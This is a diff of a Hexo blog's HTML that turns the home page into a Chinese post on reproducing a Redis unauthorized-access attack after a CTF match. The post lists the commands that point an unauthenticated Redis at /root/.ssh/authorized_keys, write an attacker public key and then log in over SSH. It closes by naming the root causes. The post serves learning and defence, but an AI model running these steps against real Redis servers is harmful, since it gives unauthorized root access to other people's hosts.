@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="redis,未授权访问,ssh," />
 
 
 
@@ -79,16 +79,23 @@
 
 
 
-<meta name="description" content="菜的不行的web狗，艰难学习中">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MelonRindCat">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta name="description" content="前言前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。">
+<meta name="keywords" content="redis,未授权访问,ssh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis未授权访问">
+<meta property="og:url" content="http://yoursite.com/2017/11/19/redis未授权访问/index.html">
 <meta property="og:site_name" content="MelonRindCat">
-<meta property="og:description" content="菜的不行的web狗，艰难学习中">
+<meta property="og:description" content="前言前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1.png">
+<meta property="og:image" content="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-2.png">
+<meta property="og:image" content="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-4.png">
+<meta property="og:image" content="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-6.png">
+<meta property="og:updated_time" content="2017-11-21T08:18:06.634Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MelonRindCat">
-<meta name="twitter:description" content="菜的不行的web狗，艰难学习中">
+<meta name="twitter:title" content="redis未授权访问">
+<meta name="twitter:description" content="前言前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。">
+<meta name="twitter:image" content="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1.png">
 
 
 
@@ -118,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/11/19/redis未授权访问/"/>
 
 
 
 
 
-  <title>MelonRindCat</title>
+  <title>redis未授权访问 | MelonRindCat</title>
   
 
 
@@ -143,8 +150,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -237,9 +243,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -269,9 +275,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/11/19/redis未授权访问/" itemprop="url">redis未授权访问</a></h1>
+          <h1 class="post-title" itemprop="name headline">redis未授权访问</h1>
         
 
         <div class="post-meta">
@@ -336,165 +340,13 @@
           
 
           
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/11/19/redis未授权访问/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/15/阿里云centos 6.8 pptp搭建笔记/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="MelonRindCat">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://owqgfzoc5.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20170923202930.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="MelonRindCat">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/10/15/阿里云centos 6.8 pptp搭建笔记/" itemprop="url">阿里云centos 6.8 pptp搭建笔记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-15T11:33:06+08:00">
-                2017-10-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学习笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">学习笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
             </span>
           
 
           
-            
-          
-
-          
-          
-             <span id="/2017/10/15/阿里云centos 6.8 pptp搭建笔记/" class="leancloud_visitors" data-flag-title="阿里云centos 6.8 pptp搭建笔记">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
 
           
 
@@ -511,16 +363,24 @@
       
 
       
-        
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近审查越来越严，酸酸乳的流量跑来跑去有点危险，于是在华南区主机尝试一下阿里云vpn的搭建情况。<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/10/15/阿里云centos 6.8 pptp搭建笔记/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。<br><a id="more"></a></p>
+<h3 id="SSH-key-文件的准备"><a href="#SSH-key-文件的准备" class="headerlink" title="SSH key 文件的准备"></a>SSH key 文件的准备</h3><p><code>ssh-keygen -t rsa</code></p>
+<p><img src="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1.png" alt="image"></p>
+<p>在当前目录先生成.ssh的文件夹，里面有两个文件，一个私钥 id_rsa,一个公钥 id_rsa.pub。</p>
+<p><img src="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-2.png" alt="image"></p>
+<h3 id="连接redis"><a href="#连接redis" class="headerlink" title="连接redis"></a>连接redis</h3><p><code>redis-cli -h 目标ip</code></p>
+<p>使用redis-cli远程管理成功连接上无认证的redis服务，由于redis拥有可以写文件的权限，所以尝试将公钥信息写入目标主机。</p>
+<p><code>config set dir /root/.ssh/</code></p>
+<p>切换当前路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">config set dbfilename authorized_keys</div><div class="line">set melon &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwfw7hBoDJmxxGC2cgaXkwWzO8PouedX1mFNcH3zw2M38y1OXF59NQh9ZBsu89cj52FQHaqMToA5SEULrsnmSdBGXbyCb4MIar6WNREX/CndH7/X5FUw3rvnmSvwHgylYCrWDMWK8amU5DLTEn5YAA13voBVJyEFj1qB76MtNnQSxKlnOrWnXimWy+4dvqKXWhJ2OdB3bDhqjghZ6RyEB1oOOKh4GiMTkmTkd5YhRjFCWlroQE3hAmRHmnPSCZTcrOkQtk2/sqodSiFNQnWO+yU6pWH23EyY6SPEGU0GGfhFUi4kDdHdUwFTxxYDAffpKaMxCf0aeH+uoiINWn50q2Q== root@iZwz9a0cr2yno695xeldpyZ\n\n\n&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
+<p>将公钥信息写入authorized_keys文件，保存。<br><img src="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-4.png" alt="image"></p>
+<h3 id="ssh连接目标主机"><a href="#ssh连接目标主机" class="headerlink" title="ssh连接目标主机"></a>ssh连接目标主机</h3><p><code>ssh 目标ip</code><br><img src="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-6.png" alt="image"><br>（这里为了避免冲突，将ssh端口改为222）<br>成功连接目标主机</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>漏洞形成的原因</p>
+<ol>
+<li>redis服务无认证，且暴露在公网。</li>
+<li>redis服务使用root权限启动。</li>
+</ol>
+
       
     </div>
     
@@ -535,327 +395,40 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/09/第四届世安杯writeup-web/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="MelonRindCat">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://owqgfzoc5.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20170923202930.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="MelonRindCat">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/10/09/第四届世安杯writeup-web/" itemprop="url">第四届世安杯writeup-web</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-09T21:50:39+08:00">
-                2017-10-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/redis/" <i class="fa fa-tag"></i> redis</a>
           
-
+            <a href="/tags/未授权访问/" <i class="fa fa-tag"></i> 未授权访问</a>
           
-            
+            <a href="/tags/ssh/" <i class="fa fa-tag"></i> ssh</a>
           
-
-          
-          
-             <span id="/2017/10/09/第四届世安杯writeup-web/" class="leancloud_visitors" data-flag-title="第四届世安杯writeup-web">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+      
       
       
 
       
-        
-          <h1 id="WEB题部分"><a href="#WEB题部分" class="headerlink" title="WEB题部分"></a>WEB题部分</h1><h2 id="1-CTF入门级题目"><a href="#1-CTF入门级题目" class="headerlink" title="1.CTF入门级题目"></a>1.CTF入门级题目</h2><p>题目给出源码，下载下来<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag = <span class="string">'*********'</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">die</span>($flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;Invalid password&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">&lt;section class="login"&gt;</div><div class="line">        &lt;div class="title"&gt;</div><div class="line">                &lt;a href=<span class="string">"./index.phps"</span>&gt;View Source&lt;/a&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line"></div><div class="line">        &lt;form method=<span class="string">"POST"</span>&gt;</div><div class="line">                &lt;input type=<span class="string">"text"</span> required name=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span> /&gt;&lt;br/&gt;</div><div class="line">                &lt;input type=<span class="string">"submit"</span>/&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">&lt;/section&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/10/09/第四届世安杯writeup-web/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/15/阿里云centos 6.8 pptp搭建笔记/" rel="next" title="阿里云centos 6.8 pptp搭建笔记">
+                <i class="fa fa-chevron-left"></i> 阿里云centos 6.8 pptp搭建笔记
+              </a>
+            
           </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
 
-    
+          <span class="post-nav-divider"></span>
 
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/23/小记/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="MelonRindCat">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://owqgfzoc5.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20170923202930.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="MelonRindCat">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/23/小记/" itemprop="url">小记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+          <div class="post-nav-prev post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-23T20:43:56+08:00">
-                2017-09-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/瞎逼逼/" itemprop="url" rel="index">
-                    <span itemprop="name">瞎逼逼</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/09/23/小记/" class="leancloud_visitors" data-flag-title="小记">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <h3 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h3><p>今天发生的事有点多，脑子宕机，在图书馆混迹了半天，闲来无事就摸了这个博客，曾经的WordPress太过臃肿，第一次尝试hexo，感觉还不错，就准备长期更新该博客,慢慢把文章迁移过来 （懒）<del>（感谢给我安利这玩意的辣鸡王-天沢）</del></p>
-<p>就酱</p>
-<p>晚安</p>
-<p><img src="http://owqgfzoc5.bkt.clouddn.com/TIM%E5%9B%BE%E7%89%8720170923205223.gif" alt="image"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -865,10 +438,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -876,6 +450,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -896,8 +474,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -991,6 +578,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH-key-文件的准备"><span class="nav-number">1.1.</span> <span class="nav-text">SSH key 文件的准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#连接redis"><span class="nav-number">1.2.</span> <span class="nav-text">连接redis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh连接目标主机"><span class="nav-number">1.3.</span> <span class="nav-text">ssh连接目标主机</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1144,6 +747,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
 
   
 
